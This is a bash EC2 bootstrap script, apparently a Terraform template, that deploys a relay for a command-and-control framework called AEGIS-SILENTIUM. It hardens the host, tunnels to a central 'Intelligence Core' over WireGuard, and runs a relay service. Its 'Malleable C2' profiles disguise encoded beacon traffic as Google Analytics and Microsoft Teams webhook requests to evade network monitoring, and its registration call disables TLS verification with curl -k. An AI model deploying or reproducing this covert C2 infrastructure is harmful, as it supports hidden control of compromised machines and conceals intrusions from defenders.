#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# AEGIS-SILENTIUM Relay — EC2 Bootstrap UserData Script
# Terraform templatefile() variables injected at provision time:
#   relay_id        — unique relay identifier
#   relay_cert_pem  — TLS certificate PEM
#   relay_key_pem   — TLS private key PEM
#   core_wg_ip      — WireGuard endpoint of Intelligence Core (IP:port)
#   core_wg_pubkey  — WireGuard public key of Core
#   relay_wg_ip     — This relay's WireGuard IP (e.g. 10.99.0.2)
#   operator_key    — AEGIS operator API key
#   profile_name    — Malleable C2 profile to load
# ═══════════════════════════════════════════════════════════════════════════════
set -euo pipefail
exec > >(tee /var/log/aegis-bootstrap.log) 2>&1

RELAY_ID="${relay_id}"
RELAY_WG_IP="${relay_wg_ip}"
CORE_WG_IP="${core_wg_ip}"
CORE_WG_PUBKEY="${core_wg_pubkey}"
PROFILE_NAME="${profile_name}"

echo "[bootstrap] Starting AEGIS-SILENTIUM Relay bootstrap for ${RELAY_ID}..."
date

# ── 1. System hardening ───────────────────────────────────────────────────────
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y -qq \
    wireguard wireguard-tools \
    iptables \
    curl wget \
    ca-certificates \
    jq \
    unzip \
    logrotate \
    fail2ban \
    ufw \
    --no-install-recommends

# Disable unnecessary services
systemctl disable --now snapd avahi-daemon cups bluetooth 2>/dev/null || true

# Kernel hardening
cat >> /etc/sysctl.conf << 'SYSCTL'
# AEGIS hardening
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.tcp_syncookies = 1
net.ipv4.conf.all.rp_filter = 1
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2
SYSCTL
sysctl -p

# ── 2. Firewall ───────────────────────────────────────────────────────────────
ufw --force reset
ufw default deny incoming
ufw default allow outgoing
ufw allow 443/tcp  comment 'AEGIS relay TLS'
ufw allow 51820/udp comment 'WireGuard'
ufw allow 22/tcp  comment 'SSH operator'
ufw --force enable

# Fail2ban config
cat > /etc/fail2ban/jail.local << 'F2B'
[DEFAULT]
bantime  = 3600
findtime = 300
maxretry = 5

[sshd]
enabled = true
port    = ssh
logpath = %(sshd_log)s

[nginx-http-auth]
enabled = false
F2B
systemctl enable fail2ban
systemctl restart fail2ban

# ── 3. Write TLS certificates ─────────────────────────────────────────────────
mkdir -p /etc/aegis/certs /etc/aegis/profiles /var/log/aegis /opt/aegis
chmod 700 /etc/aegis/certs

cat > /etc/aegis/certs/relay_cert.pem << 'CERTEOF'
${relay_cert_pem}
CERTEOF

cat > /etc/aegis/certs/relay_key.pem << 'KEYEOF'
${relay_key_pem}
KEYEOF
chmod 600 /etc/aegis/certs/relay_key.pem

# ── 4. Write relay config ─────────────────────────────────────────────────────
cat > /etc/aegis/relay.yaml << RELAYCONF
listen:
  addr: "0.0.0.0:443"
  cert_file: /etc/aegis/certs/relay_cert.pem
  key_file:  /etc/aegis/certs/relay_key.pem

core:
  url: https://${core_wg_ip%:*}:5000
  timeout: 30s

crypto:
  max_session_age: 300

profile:
  file: /etc/aegis/profiles/${profile_name}.yaml
  fallback_raw: false

security:
  rate_limit: 150
  max_body_bytes: 1048576
  kill_switch_file: /tmp/aegis_kill

logging:
  level: info
  file: /var/log/aegis/relay.log
  json: true
RELAYCONF

# ── 5. Download and install relay binary ──────────────────────────────────────
# In production: replace S3_RELAY_URL with your binary distribution mechanism.
# For local builds, push the binary via provisioner or bake into a custom AMI.
# Here we demonstrate downloading from an S3 private bucket.

RELAY_BINARY_URL="$${S3_RELAY_URL:-}"
if [[ -n "$$RELAY_BINARY_URL" ]]; then
    curl -sf --retry 3 --retry-delay 5 \
        -H "X-Aws-Ec2-Metadata-Token: $(curl -sf -X PUT -H 'X-Aws-Ec2-Metadata-Token-Ttl-Seconds: 60' http://169.254.169.254/latest/api/token)" \
        "$$RELAY_BINARY_URL" -o /opt/aegis/relay
    chmod 755 /opt/aegis/relay
else
    echo "[bootstrap] WARNING: No S3_RELAY_URL set — building from source"
    # Fallback: build relay from source (requires Go)
    apt-get install -y -qq golang-go
    mkdir -p /tmp/relay_build
    # Source would be cloned/copied here in production
    echo "[bootstrap] SKIPPED — configure S3_RELAY_URL or bake into AMI"
fi

# ── 6. Write Malleable C2 profiles ────────────────────────────────────────────
cat > /etc/aegis/profiles/default.yaml << 'PROFILEEOF'
name: default-rest-api
version: "1.0"
default_headers:
  X-Request-Id: "auto"
  Cache-Control: "no-store"
uris:
  - /api/v1/events
  - /api/v1/auth/token
client:
  container: json
  key: "events"
  transforms:
    - op: gzip
    - op: base64
server:
  container: json
  key: "data"
  transforms:
    - op: gzip
    - op: base64
PROFILEEOF

cat > /etc/aegis/profiles/google-analytics.yaml << 'PROFILEEOF'
name: google-analytics-ga4
version: "1.0"
default_headers:
  User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  Accept: "*/*"
uris:
  - /g/collect
  - /gtag/js
client:
  container: json
  key: "session_data"
  transforms:
    - op: gzip
    - op: base64url
server:
  container: json
  key: "r"
  transforms:
    - op: gzip
    - op: base64url
PROFILEEOF

cat > /etc/aegis/profiles/microsoft-teams.yaml << 'PROFILEEOF'
name: microsoft-teams-webhook
version: "1.0"
default_headers:
  User-Agent: "Microsoft Teams (1.6.00.4472) Desktop/Windows"
  Content-Type: "application/json; charset=utf-8"
uris:
  - /webhook/v1.0/action
  - /webhook/v1.0/auth
client:
  container: json
  key: "body"
  transforms:
    - op: gzip
    - op: base64
server:
  container: json
  key: "response"
  transforms:
    - op: gzip
    - op: base64
PROFILEEOF

# ── 7. WireGuard setup ────────────────────────────────────────────────────────
wg genkey | tee /etc/wireguard/private.key | wg pubkey > /etc/wireguard/public.key
chmod 600 /etc/wireguard/private.key
WG_PRIVATE=$(cat /etc/wireguard/private.key)
WG_PUBLIC=$(cat /etc/wireguard/public.key)

cat > /etc/wireguard/wg0.conf << WGCONF
[Interface]
Address    = ${RELAY_WG_IP}/24
PrivateKey = $${WG_PRIVATE}

[Peer]
PublicKey           = ${CORE_WG_PUBKEY}
Endpoint            = ${CORE_WG_IP}
AllowedIPs          = 10.99.0.1/32
PersistentKeepalive = 25
WGCONF
chmod 600 /etc/wireguard/wg0.conf

systemctl enable wg-quick@wg0
wg-quick up wg0

echo "[bootstrap] WireGuard public key for this relay: $${WG_PUBLIC}"
echo "[bootstrap] Add this to the Core's [Peer] block: AllowedIPs = ${RELAY_WG_IP}/32"

# Register relay public key with core (if core API reachable via WG)
sleep 5
curl -sf --retry 5 --retry-delay 5 \
    -X POST \
    -H "Content-Type: application/json" \
    -H "X-Aegis-Key: ${operator_key}" \
    -d "{\"relay_id\":\"${RELAY_ID}\",\"wg_pubkey\":\"$${WG_PUBLIC}\",\"wg_ip\":\"${RELAY_WG_IP}\"}" \
    "https://10.99.0.1:5000/api/relay/register" \
    --cacert /etc/aegis/certs/relay_cert.pem \
    -k \
    || echo "[bootstrap] WARNING: Could not register relay with core (may need manual step)"

# ── 8. Systemd service for relay ─────────────────────────────────────────────
cat > /etc/systemd/system/aegis-relay.service << 'SVCEOF'
[Unit]
Description=AEGIS-SILENTIUM Relay
After=network.target wg-quick@wg0.service
Requires=wg-quick@wg0.service

[Service]
Type=simple
User=nobody
Group=nogroup
ExecStart=/opt/aegis/relay --config /etc/aegis/relay.yaml
Restart=on-failure
RestartSec=5
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
ReadWritePaths=/var/log/aegis /tmp
PrivateTmp=yes
CapabilityBoundingSet=CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_BIND_SERVICE
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
SVCEOF

systemctl daemon-reload
systemctl enable aegis-relay

# Only start if binary exists
if [[ -x /opt/aegis/relay ]]; then
    systemctl start aegis-relay
    sleep 2
    systemctl status aegis-relay --no-pager
fi

# ── 9. Log rotation ──────────────────────────────────────────────────────────
cat > /etc/logrotate.d/aegis-relay << 'LOGEOF'
/var/log/aegis/*.log {
    daily
    missingok
    rotate 7
    compress
    delaycompress
    notifempty
    create 640 nobody nogroup
    sharedscripts
    postrotate
        systemctl kill -s HUP aegis-relay 2>/dev/null || true
    endscript
}
LOGEOF

# ── 10. Record bootstrap metadata ────────────────────────────────────────────
cat > /etc/aegis/bootstrap_info.json << METAEOF
{
  "relay_id": "${RELAY_ID}",
  "relay_wg_ip": "${RELAY_WG_IP}",
  "profile": "${PROFILE_NAME}",
  "wg_pubkey": "$${WG_PUBLIC}",
  "bootstrapped_at": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "instance_id": "$(curl -sf http://169.254.169.254/latest/meta-data/instance-id || echo unknown)"
}
METAEOF

echo "[bootstrap] AEGIS-SILENTIUM Relay ${RELAY_ID} bootstrap COMPLETE"
echo "[bootstrap] WireGuard IP: ${RELAY_WG_IP}"
echo "[bootstrap] Profile: ${PROFILE_NAME}"
echo "[bootstrap] Log: /var/log/aegis/relay.log"
